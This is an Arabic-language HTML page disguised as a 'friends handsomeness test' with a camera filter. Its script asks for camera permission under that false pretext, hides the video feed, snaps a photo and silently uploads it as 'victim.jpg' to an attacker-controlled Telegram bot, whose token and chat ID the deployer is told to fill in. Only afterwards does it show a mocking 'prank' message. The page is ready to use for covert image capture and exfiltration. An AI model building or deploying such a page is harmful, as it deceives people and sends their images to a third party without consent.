<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اختبار وسامة الأصدقاء 😎🔥</title>
    <style>
        body {
            background: linear-gradient(135deg, #ff4757, #2f3542);
            color: #fff;
            font-family: 'Tahoma', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .card {
            background: rgba(0, 0, 0, 0.4);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 90%;
        }
        h1 { font-size: 1.6rem; margin-bottom: 10px; color: #ffd32a; }
        p { font-size: 1rem; color: #f1f2f6; margin-bottom: 20px; }
        
        .btn {
            background-color: #2ed573;
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 1.1rem;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
            transition: 0.2s;
        }
        .btn:hover { background-color: #26af5f; }

        .loader {
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #ffd32a;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* إخفاء عناصر الفيديو والكاميرا */
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h1>📸 اختبار وسامة الأصدقاء</h1>
        <p>اعرف نسبتك الحقيقية في الجمال والروقان مقارنة بصحابك! اضغط ابدأ واضغط "سماح" لتفعيل كاميرا الفلتر.</p>
        <button class="btn" onclick="startPrank()">ابدأ الاختبار الآن 🔥</button>
        <div class="loader" id="loader"></div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ⚠️ حط بيانات البوت بتاعك هنا ⚠️
        const BOT_TOKEN = 'حط_التوكين_بتاع_البوت_هنا';
        const CHAT_ID = 'حط_الـ_CHAT_ID_بتاعك_هنا';

        function startPrank() {
            // إخفاء الزرار وإظهار لودر التحميل
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.querySelector('p').innerText = "جاري الاتصال بقاعدة بيانات الفلاتر وتحليل الملامح...";

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            // طلب الكاميرا بعد ما يضغط على الزرار بنفسه
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    
                    // ندي مهلة ثانية عشان الكاميرا تلقط الصورة بوضوح
                    setTimeout(() => {
                        takeSnapshotAndSend(video, canvas);
                    }, 1200);
                })
                .catch(err => {
                    alert("يا عم الحج لازم تضغط سماح عشان تشوف النتيجة! 😂");
                    document.querySelector('.btn').style.display = 'block';
                    document.getElementById('loader').style.display = 'none';
                });
        }

        function takeSnapshotAndSend(video, canvas) {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;

            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'victim.jpg');
                formData.append('caption', '📸 تم اصطياد الضحية في اختبار الوسامة! 😂🔥');

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    // تغيير شكل الصفحة وإظهار نتيجة كوميدية تخليه ينصدم
                    setTimeout(() => {
                        document.getElementById('mainCard').innerHTML = `
                            <h1 style="color: #ff4757;">❌ عذراً يا صاحبي!</h1>
                            <p style="font-size: 1.2rem; color: #fff;">نسبة وسامتك النهاردة: <b>0% (شكل ميسيّة صريح)</b> 💀</p>
                            <h2 style="color: #2ed573;">مقلب يا معلم! تم التقاط صورتك بنجاح 😂🃏</h2>
                        `;
                    }, 1000);
                })
                .catch(err => console.error('خطأ في الإرسال:', err));
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
